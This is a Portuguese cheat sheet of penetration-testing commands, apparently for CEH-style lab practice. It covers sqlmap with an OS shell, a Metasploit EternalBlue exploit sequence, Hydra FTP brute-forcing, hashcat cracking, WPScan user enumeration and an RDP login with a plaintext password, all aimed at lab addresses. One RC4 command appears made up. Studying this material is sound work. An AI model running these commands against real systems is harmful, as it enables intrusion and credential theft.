Notes 01 Tools


Blind SQL Injection: Use sqlmap para automatizar a detecção de SQL Injection e obter informações sobre o sistema operacional.

bash
sqlmap -u "URL_DO_SITE" --dbms=mysql --os-shell
Enumeração de Usuários de Domínio: Utilize net user e net group para listar usuários e grupos no domínio.

bash
net user
net group /domain
Varredura de Portas RDP: Utilize Nmap para identificar portas abertas e serviços.

bash
nmap -p 3389 --open 172.16.0.0/24
Descriptografia DES (ECB): Use openssl para descriptografar arquivos usando o algoritmo DES.

bash
openssl enc -d -des-ecb -in Cry-DES-FTP-IP.hex -out decrypted.txt
Esteganografia: Utilize steghide para extrair dados ocultos em arquivos.

bash
steghide extract -sf Confidential.txt -p test
Banco de Dados WordPress: Utilize WPScan para enumerar usuários e obter senhas.

bash
wpscan --url http://172.16.0.27:8080/CEH --enumerate u
Quebra de Hash MD5: Utilize hashcat para quebrar hashes MD5.

bash
hashcat -m 0 -a 0 hash.txt wordlist.txt
Backdoor e Recuperação de Arquivos: Utilize Metasploit para explorar backdoors e obter arquivos.

bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 172.16.0.27
exploit
Análise de Pacotes de Rede: Utilize Wireshark para analisar arquivos de captura de pacotes (pcapng).

bash
wireshark Dos.pcapng
Análise de Ataque DDoS: Utilize Wireshark para identificar o número de máquinas que participaram do ataque.

bash
wireshark DDoS.pcapng
Quebra de Credenciais FTP: Utilize Hydra para força bruta em servidores FTP.

bash
hydra -l username -P password_list.txt ftp://172.16.0.27
Conexão RDP: Utilize rdesktop para acessar o servidor Windows remotamente.

bash
rdesktop -u Administrator -p shadow123 172.16.0.27
Ataque SQLi: Utilize sqlmap para testar vulnerabilidades SQL.

bash
sqlmap -u "http://www.moviescope.com" --cookie="SESSAO"
Análise de Tráfego em Texto Plano: Utilize Wireshark para capturar e analisar tráfego HTTP.

bash
wireshark moviescope.com.pcapng
Teste de Método HTTP: Utilize OWASP ZAP para testar diferentes métodos HTTP.

bash
OWASP ZAP
Verificação de Integridade de Arquivos: Utilize md5sum para comparar hashes de arquivos.

bash
md5sum original_file tampered_file
Descriptografia VeraCrypt: Utilize VeraCrypt para montar volumes criptografados e acessar arquivos.

bash
veracrypt --mount secret
Descriptografia RC4: Utilize CrypTool para descriptografar arquivos RC4.

bash
cryp rc4 -in Cry-Rc4-Accountno.hex -out decrypted.txt -key 14
Acesso ao Android: Utilize ADB (Android Debug Bridge) para acessar e manipular arquivos em dispositivos Android.

bash
adb shell
Decodificação de Dados: Utilize base64 ou outras ferramentas de decodificação conforme necessário.

bash
echo "conteúdo codificado" | base64 --decode
